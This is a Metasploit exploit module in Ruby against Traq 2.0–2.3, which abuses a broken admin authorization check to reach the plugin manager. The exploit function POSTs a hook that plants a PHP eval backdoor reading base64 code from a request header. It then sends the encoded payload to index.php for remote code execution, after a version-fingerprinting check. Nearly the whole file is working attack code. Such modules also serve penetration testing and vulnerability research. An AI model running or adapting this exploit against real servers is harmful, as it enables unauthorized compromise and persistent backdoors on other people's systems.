# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Traq <= 2.3 Authentication Bypass / Remote Code Execution Exploit&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary command execution vulnerability in
        Traq 2.0 to 2.3. It&#039;s in the admincp/common.php script.

        This function is called in each script located into /admicp/ directory to
        make sure the user has admin rights, but this is a broken authorization
        schema due to the header() function doesn&#039;t stop the execution flow. This
        can be exploited by malicious users to execute admin functionality resulting
        for  e.g.  in execution of arbitrary PHP code leveraging of plugins.php
        functionality.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;EgiX&#039;,  # Vulnerability discovery and exploit
          &#039;TecR0c&#039; # Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18213/&#039; ],
          [ &#039;URL&#039;, &#039;http://traqproject.org/&#039; ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Keys&#039;        => [&#039;php&#039;],
          &#039;Space&#039;       => 4000,
          &#039;DisableNops&#039; => true,
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, {} ]],
      &#039;DisclosureDate&#039; => &#039;Dec 12 2011&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;URI&#039;, [true, "The path to the Traq installation", "/"]),
      ],self.class)
  end

  def check
    uri = datastore[&#039;URI&#039;]
    uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? "admincp/login.php" : "/admincp/login.php"

    res = send_request_raw(
      {
        &#039;uri&#039;=> uri
      }, 25)

    if (res and res.body =~ /Powered by Traq 2.[0-3]/ )
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    p = Rex::Text.encode_base64(payload.encoded)

    uri = datastore[&#039;URI&#039;]
    uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? "admincp/plugins.php?newhook" : "/admincp/plugins.php?newhook"

    res = send_request_cgi(
      {
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => uri,
        &#039;vars_post&#039; =>
          {
            &#039;plugin_id&#039; => &#039;1&#039;,
            &#039;title&#039; => &#039;1&#039;,
            &#039;execorder&#039; => &#039;0&#039;,
            &#039;hook&#039; => &#039;template_footer&#039;,
            &#039;code&#039; => &#039;error_reporting(0);eval(base64_decode($_SERVER[HTTP_CMD]));die;&#039;
          }
      }, 25)

    uri = datastore[&#039;URI&#039;]
    uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? "index.php" : "/index.php"

    res = send_request_cgi(
      {
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => uri,
        &#039;headers&#039; =>
          {
            &#039;CMD&#039; => p,
            &#039;Connection&#039; => &#039;Close&#039;,
          },
      }, 25)
  end
end



